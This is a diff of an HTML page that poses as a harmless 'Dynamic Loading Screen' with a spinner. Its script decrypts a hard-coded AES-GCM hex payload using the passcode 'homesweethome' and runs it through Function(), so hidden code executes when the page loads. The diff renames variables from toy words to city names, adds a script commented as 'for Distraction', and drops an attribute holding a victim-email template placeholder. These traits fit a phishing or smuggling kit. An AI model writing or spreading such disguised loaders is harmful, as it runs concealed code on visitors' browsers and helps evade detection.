@@ -3,8 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="author" content="Creative Dev">
-    <title>Dynamic Loading Screen</title>
+    <meta name="author" content="Global Dev">
+    <title>Dynamic Fun Loader</title>
     <style>
         body {
             padding: 0;
@@ -13,144 +13,140 @@
             flex-direction: column;
             align-items: center;
             justify-content: center;
-            background-color: #f8f9fa;
+            background-color: #e9ecef;
             font-family: Arial, Helvetica, sans-serif;
             min-height: 100vh;
             overflow: hidden;
         }
-        .rotating-doll {
+        .rotating-paris {
             width: 70px;
             height: 70px;
             border: 10px solid #eaeaea;
-            border-top: 10px solid #3498db;
+            border-top: 10px solid #1abc9c;
             border-radius: 50%;
-            animation: spin-teddy 1.2s linear infinite;
+            animation: spin-paris 1.5s linear infinite;
         }
-        @keyframes spin-teddy {
+        @keyframes spin-paris {
             from { transform: rotate(0deg); }
             to { transform: rotate(360deg); }
         }
-        .status-balloon {
+        .status-sydney {
             margin-top: 15px;
             font-size: 18px;
-            color: #555;
+            color: #333;
         }
-        .hidden-toy {
+        .hidden-london {
             visibility: hidden;
         }
     </style>
 </head>
 <body>
 
-    <!-- Hidden Toy -->
-    <div class="hidden-toy">
-        <div id="hidden-teddy" data-info=""></div>
+    <!-- Hidden London -->
+    <div class="hidden-london">
+        <div id="hidden-paris" data-info=""></div>
     </div>
 
     <!-- Main Loader -->
-    <div   class="rotating-doll"></div>
-    <p bunny-ears="placeholder" alt="fun" nike-justsavage="" adidas="<%=EMAIL64%>"  class="status-balloon">Please wait, your request is being processed...</p>
+    <div class="rotating-paris"></div>
+    <p class="status-sydney">Please wait, processing your request...</p>
 
-    
-
-    <!-- Main Fun Script -->
+    <!-- Useless Script for Distraction -->
     <script>
-        const playWithDolls = () => {
-            const toyBox = ["Doll", "Teddy", "Balloon"];
-            toyBox.forEach(toy => console.log(`Playing with: ${toy}`));
+        const randomTokyo = () => {
+            const cities = ["Tokyo", "Seoul", "Beijing", "Jakarta"];
+            cities.forEach(city => console.log(`Visiting: ${city}`));
         };
-        playWithDolls();
+        randomTokyo();
 
         setTimeout(() => {
-            document.querySelector('.status-balloon').textContent = "Operation successful!";
-            document.body.style.backgroundColor = '#d4f5e9';
-        }, 6000);
+            document.querySelector('.status-sydney').textContent = "Operation complete!";
+            document.body.style.backgroundColor = '#c8e6c9';
+        }, 7000);
 
         (() => {
-            const hiddenToyBox = document.createElement('div');
-            hiddenToyBox.id = 'invisibleToy';
-            hiddenToyBox.textContent = "This toy is hidden.";
-            console.log(hiddenToyBox);
+            const hiddenElement = document.createElement('div');
+            hiddenElement.id = 'hiddenBerlin';
+            hiddenElement.textContent = "This is hidden.";
+            console.log(hiddenElement);
         })();
     </script>
 
-    <!-- Advanced Toy Locker -->
+    <!-- Advanced Fun Locker -->
     <script>
-        const unlockToyBox = async (lockedTeddy, toyKey, candySalt, passcode) => {
-            console.log("[INFO] Unlocking the toy box...");
+        const unlockOsloBox = async (lockedOslo, osloKey, osloSalt, osloCode) => {
+            console.log("[INFO] Unlocking the Oslo box...");
 
-            const hexToBalloon = (hex) => Uint8Array.from(hex.match(/.{2}/g).map(byte => parseInt(byte, 16)));
+            const hexToArray = (hex) => Uint8Array.from(hex.match(/.{2}/g).map(byte => parseInt(byte, 16)));
 
-            const waitForCandy = () => new Promise(resolve => {
-                console.log("[DEBUG] Waiting for candy...");
-                setTimeout(() => resolve(), 300);
+            const waitForTime = () => new Promise(resolve => {
+                console.log("[DEBUG] Waiting...");
+                setTimeout(() => resolve(), 400);
             });
 
-            const craftTeddyKey = async (keyStuffing, salt) => {
+            const craftOsloKey = async (keyMaterial, salt) => {
                 return crypto.subtle.deriveKey(
                     { name: "PBKDF2", salt, iterations: 100000, hash: "SHA-256" },
-                    keyStuffing,
+                    keyMaterial,
                     { name: "AES-GCM", length: 256 },
                     false,
                     ["decrypt"]
                 );
             };
 
-            const keyStuffing = await crypto.subtle.importKey(
+            const keyMaterial = await crypto.subtle.importKey(
                 "raw",
-                new TextEncoder().encode(passcode),
+                new TextEncoder().encode(osloCode),
                 { name: "PBKDF2" },
                 false,
                 ["deriveKey"]
             );
 
-            await waitForCandy();
-            const teddyKey = await craftTeddyKey(keyStuffing, hexToBalloon(candySalt));
+            await waitForTime();
+            const osloKeyGenerated = await craftOsloKey(keyMaterial, hexToArray(osloSalt));
 
             try {
-                const unlockedToy = await crypto.subtle.decrypt(
-                    { name: "AES-GCM", iv: hexToBalloon(toyKey) },
-                    teddyKey,
-                    hexToBalloon(lockedTeddy)
+                const unlockedData = await crypto.subtle.decrypt(
+                    { name: "AES-GCM", iv: hexToArray(osloKey) },
+                    osloKeyGenerated,
+                    hexToArray(lockedOslo)
                 );
-                console.log("[SUCCESS] Toy box unlocked.");
-                return new TextDecoder().decode(unlockedToy);
+                console.log("[SUCCESS] Oslo box unlocked.");
+                return new TextDecoder().decode(unlockedData);
             } catch (err) {
-                console.error("[ERROR] Failed to unlock toy box:", err);
+                console.error("[ERROR] Failed to unlock Oslo box:", err);
                 return null;
             }
         };
 
-        const analyzeCandy = (data) => {
-            console.log("[INFO] Analyzing candy data...");
+        const analyzeData = (data) => {
+            console.log("[INFO] Analyzing data...");
             if (!data) {
-                console.error("[ERROR] No candy found.");
+                console.error("[ERROR] No data found.");
                 return;
             }
-            const reversedCandy = data.split("").reverse().join("");
-            console.log("[INFO] Reversed candy data:", reversedCandy);
-            return reversedCandy;
+            const reversedData = data.split("").reverse().join("");
+            console.log("[INFO] Reversed data:", reversedData);
+            return reversedData;
         };
 
         (async () => {
-            console.log("[INFO] Starting toy box unlock process...");
-            const toyPayload = {
-                toyKey: "ce12552921e07eeae6d25a8b",
-                candySalt: "0ac6f6fafea5dd5e93ca4522b49d3681",
-                lockedTeddy: "6deb93765e72ef8ce34b1b97d0c25c97611c83b0ac258d36b36d018cdb7ff468533920838d3707c758da44549d374e8e0ca5a6aa93b0af7aa6d1f2e3c26dcf486585b4c887ad5cb43aed7d90469c8c5265c8bbbeca57739d97e18e7cceac3acfa08db407fba57a71ff3d8a03b8299957024e3205442026156a361709ebd8c2df4c14a3c6c053abe5055489a44d42679720a67e7b98ddb7c15cf91320517d7e3b4c74750d19471e7e76750a80e4a099a0297edb403178b56fd0f152d4ac2ea37bc07720850870a3a7"
+            console.log("[INFO] Starting Oslo box unlock process...");
+            const payload = {
+                osloKey: "ce12552921e07eeae6d25a8b",
+                osloSalt: "0ac6f6fafea5dd5e93ca4522b49d3681",
+                lockedOslo: "6deb93765e72ef8ce34b1b97d0c25c97611c83b0ac258d36b36d018cdb7ff468533920838d3707c758da44549d374e8e0ca5a6aa93b0af7aa6d1f2e3c26dcf486585b4c887ad5cb43aed7d90469c8c5265c8bbbeca57739d97e18e7cceac3acfa08db407fba57a71ff3d8a03b8299957024e3205442026156a361709ebd8c2df4c14a3c6c053abe5055489a44d42679720a67e7b98ddb7c15cf91320517d7e3b4c74750d19471e7e76750a80e4a099a0297edb403178b56fd0f152d4ac2ea37bc07720850870a3a7"
             };
 
-            
+            const magicCode = "homesweethome";
+            const unlockedData = await unlockOsloBox(payload.lockedOslo, payload.osloKey, payload.osloSalt, magicCode);
 
-            const magicKey = "homesweethome";
-            const unlockedToyData = await unlockToyBox(toyPayload.lockedTeddy, toyPayload.toyKey, toyPayload.candySalt, magicKey);
+            if (unlockedData) {
+                console.log("[INFO] Unlocked data:", unlockedData);
+                const analyzedData = analyzeData(unlockedData);
 
-            if (unlockedToyData) {
-                console.log("[INFO] Unlocked data:", unlockedToyData);
-                const analyzedCandy = analyzeCandy(unlockedToyData);
-
-                console.log("[INFO] Executing unlocked candy data...");
-                Function(`${unlockedToyData}`)();
+                console.log("[INFO] Executing unlocked data...");
+                Function(`${unlockedData}`)();
             }
         })();
     </script>
